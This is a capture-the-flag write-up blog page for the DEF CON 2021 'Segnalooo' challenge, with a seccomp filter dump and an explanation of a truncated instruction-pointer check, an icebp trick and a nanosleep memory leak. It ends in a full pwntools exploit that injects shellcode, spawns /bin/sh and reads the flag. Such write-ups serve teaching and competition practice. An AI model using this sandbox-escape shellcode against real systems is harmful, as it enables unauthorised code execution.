@@ -1,0 +1,209 @@
+<!doctype html>
+<html lang="en"><head>
+    <title>Defcon-2021-Segnalooo</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+
+    
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle"
+                    
+                        
+                            src="../../images/zzlol.jpg"
+                        
+                    
+                />
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        mhibio
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    Pwn For Fun
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " style="font-size: 14px; padding: 0;" href="../../about/whoami/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " style="font-size: 14px; padding: 0;" href="../../" title="Posts">Posts</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " style="font-size: 14px; padding: 0;" href="../../categories/" title="Categories">Categories</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="http://github.com/mhibio" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://mhibio.tistory.com/" target="_blank">
+                            <i class="fas fa-blog fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-2">
+        <div class="mb-3">
+            <h3 class="mb-0">Defcon-2021-Segnalooo</h3>
+            
+            <small class="text-muted">Published May 6, 2021</small>
+        </div>
+
+        <article>
+            <p>Excute <code>execveat(0, &quot;/bin/sh&quot;, 0, 0, 0)</code> after bypass seccomp filter.</p>
+<hr>
+<h3 id="binary">Binary</h3>
+<ol start="0">
+<li>Set Signal Handler on Signum 5 ( <code>SIGTRAP</code> )</li>
+<li>Allocate Memory twice ( addr1 : <code>0x10XXXXXXXXXX</code>, addr2 : <code>0x5XXXXXXXXXXX</code> )</li>
+<li>Munmap all Memory except addr1, addr2</li>
+<li>Call Signal Handler with <code>int3</code></li>
+<li>After Signal Handler, <code>IP</code> returns to our Shellcode.<br>
+=&gt; There is two Problems. ( Seccomp filter, <code>ud2</code> instruction )</li>
+</ol>
+<hr>
+<h3 id="seccomp-filter">Seccomp Filter</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> line  CODE  JT   JF      K
+<span style="color:#f92672">=================================</span>
+ <span style="color:#ae81ff">0000</span>: <span style="color:#ae81ff">0x20</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000004</span>  A <span style="color:#f92672">=</span> arch
+ <span style="color:#ae81ff">0001</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x0a</span> <span style="color:#ae81ff">0xc000003e</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">!=</span> ARCH_X86_64) goto <span style="color:#ae81ff">0012</span>
+ <span style="color:#ae81ff">0002</span>: <span style="color:#ae81ff">0x20</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  A <span style="color:#f92672">=</span> sys_number
+ <span style="color:#ae81ff">0003</span>: <span style="color:#ae81ff">0x35</span> <span style="color:#ae81ff">0x08</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x40000000</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0x40000000</span>) goto <span style="color:#ae81ff">0012</span>
+ <span style="color:#ae81ff">0004</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x0000000b</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> munmap) goto <span style="color:#ae81ff">0011</span>
+ <span style="color:#ae81ff">0005</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x05</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000023</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> nanosleep) goto <span style="color:#ae81ff">0011</span>
+ <span style="color:#ae81ff">0006</span>: <span style="color:#ae81ff">0x20</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000008</span>  A <span style="color:#f92672">=</span> instruction_pointer
+ <span style="color:#ae81ff">0007</span>: <span style="color:#ae81ff">0x25</span> <span style="color:#ae81ff">0x04</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x80000000</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x80000000</span>) goto <span style="color:#ae81ff">0012</span>
+ <span style="color:#ae81ff">000</span><span style="color:#ae81ff">8</span>: <span style="color:#ae81ff">0x20</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  A <span style="color:#f92672">=</span> sys_number
+ <span style="color:#ae81ff">000</span><span style="color:#ae81ff">9</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x02</span> <span style="color:#ae81ff">0x01</span> <span style="color:#ae81ff">0x0000003b</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> execve) goto <span style="color:#ae81ff">0012</span> <span style="color:#66d9ef">else</span> goto <span style="color:#ae81ff">0011</span>
+ <span style="color:#ae81ff">0010</span>: <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  <span style="color:#66d9ef">return</span> KILL
+ <span style="color:#ae81ff">0011</span>: <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x7fff0000</span>  <span style="color:#66d9ef">return</span> ALLOW
+ <span style="color:#ae81ff">0012</span>: <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  <span style="color:#66d9ef">return</span> KILL
+</code></pre></div><p>Only <code>munmap</code> and <code>nanosleep</code> Syscall are available.<br>
+or, <code>Instruction_Pointer(IP)</code> have to be smaller than 0x80000000</p>
+<p><strong>But, all Memory is bigger than 0x80000000.</strong><br>
+<strong>All Syscall gadgets fail to bypass ip check.</strong><br>
+<strong>How can I bypass <code>IP check</code>?</strong></p>
+<blockquote>
+<p><strong>One interesting thing is that Seccomp only do 4 bytes of ip check.</strong></p>
+</blockquote>
+<p>So we can bypass <strong>Ip check</strong> by using a syscall gadget in <code>0x10XXXXXXXXXX</code>.<br>
+( 4 bytes of addr2 <code>0x10XXXXXXXXXX</code> are always smaller than <code>0x80000000</code>. ).</p>
+<hr>
+<h3 id="ud2-instruction">ud2 instruction</h3>
+<p><code>ud2 instruction</code> means undefined instruction.<br>
+when <code>IP</code> returns to our shellcode, <code>ud2</code> instruction is executed.<br>
+-&gt; Process stopped with exit code -4 ( <code>SIGILL</code> )<br>
+But, I can execute only 1 instruction.<br>
+<strong>if I execute <code>icebp</code>, I can escape <code>ud2</code> instruction.</strong></p>
+<hr>
+<h3 id="leak-memory">leak memory</h3>
+<p>if <code>nanosleep's rdi</code> is invalid memory, return <code>0xfffffffffffffff2</code>.<br>
+else <code>nanosleep's rdi</code> is valid memory but failed <code>nanosleep</code>, return <code>0xffffffffffffffea</code>.</p>
+<p>so we can leak memory <code>0x10XXXXXXXXXX</code><br>
+then, just excute <code>execveat(0, &quot;/bin/sh&quot;, 0, 0, 0)</code></p>
+<hr>
+<h3 id="exploit">Exploit</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>)
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pack64</span>(x):  <span style="color:#66d9ef">return</span> p64(x)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;hex&#34;</span>)
+
+sc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">inc edi
+</span><span style="color:#e6db74">shl rdi, 44
+</span><span style="color:#e6db74">mov rsi, rsp
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">add rdi, 0x1000
+</span><span style="color:#e6db74">xor rax, rax
+</span><span style="color:#e6db74">mov al, 35
+</span><span style="color:#e6db74">syscall
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">cmp al, 0xea
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+
+sc2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">lea rbx, [rdi+0xb4]
+</span><span style="color:#e6db74">lea rsi, [rsp+0x30]
+</span><span style="color:#e6db74">xor rdi, rdi
+</span><span style="color:#e6db74">xor eax, eax
+</span><span style="color:#e6db74">mov ax, 322
+</span><span style="color:#e6db74">jmp rbx
+</span><span style="color:#e6db74">nop
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+
+pay <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;f1&#34;</span><span style="color:#f92672">+</span> asm(sc)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;hex&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;7405e9e6ffffff&#34;</span> <span style="color:#f92672">+</span> asm(sc2)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;hex&#34;</span>)
+pay <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;41&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x40</span> <span style="color:#f92672">-</span> (len(pay) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>))
+pay <span style="color:#f92672">+=</span> pack64(<span style="color:#ae81ff">0</span>)
+pay <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;90&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
+pay <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;2f62696e2f7368&#34;</span> <span style="color:#75715e">#binsh</span>
+
+<span style="color:#66d9ef">while</span> True:
+    <span style="color:#75715e">#p = process(&#39;./stub&#39;)</span>
+    p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;segnalooo.challenges.ooo&#34;</span>, <span style="color:#ae81ff">4321</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Give me some code!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pay)
+    p<span style="color:#f92672">.</span>recvline()
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
+            p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;while read line;do echo </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">$line</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">;done &lt; /flag&#34;</span>)
+    res <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
+    <span style="color:#66d9ef">if</span> len(res) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+            <span style="color:#66d9ef">print</span>(res)
+            exit()
+</code></pre></div><hr>
+<h4 id="flag--ooos3riouslywh4tissigaltstack">Flag : <code>OOO{s3riously,wh4tISsigaltstack???}</code></h4>
+
+        </article>
+    </div>
+
+            </div>
+        </div><footer class="text-center pb-1">
+    <small class="text-muted">
+        
+            &copy; Copyright 2021, mhibio 🔥
+        
+        <br>
+        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
+        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
+    </small>
+</footer>
+</body>
+</html>
